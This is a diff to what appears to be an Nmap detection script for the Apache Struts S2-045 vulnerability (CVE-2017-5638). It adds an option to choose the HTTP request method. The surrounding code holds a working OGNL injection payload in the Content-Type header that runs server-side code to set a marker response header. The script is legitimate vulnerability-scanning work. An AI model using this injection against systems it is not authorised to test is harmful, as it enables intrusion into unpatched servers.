@@ -28,6 +28,7 @@ local string = require "string"
 -- |       https://cwiki.apache.org/confluence/display/WW/S2-045
 -- |_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
 --
+-- @args http-vuln-cve2017-5638.method The HTTP method for the request. The default method is "GET".
 -- @args http-vuln-cve2017-5638.path The URL path to request. The default path is "/".
 
 author = "Seth Jackson"
@@ -58,6 +59,7 @@ vulnerability via the Content-Type header.
 
     local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
+    local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "GET"
     local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/"
     local value = stdnse.generate_random_string(8)
 
@@ -65,7 +67,7 @@ vulnerability via the Content-Type header.
         ["Content-Type"] = string.format("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", value)
     }
 
-    local response = http.post(host, port, path, { header = header })
+    local response = http.generic_request(host, port, method, path, { header = header })
 
     if response and response.status == 200 and response.header["x-check-struts"] == value then
         vuln.state = vulns.STATE.VULN
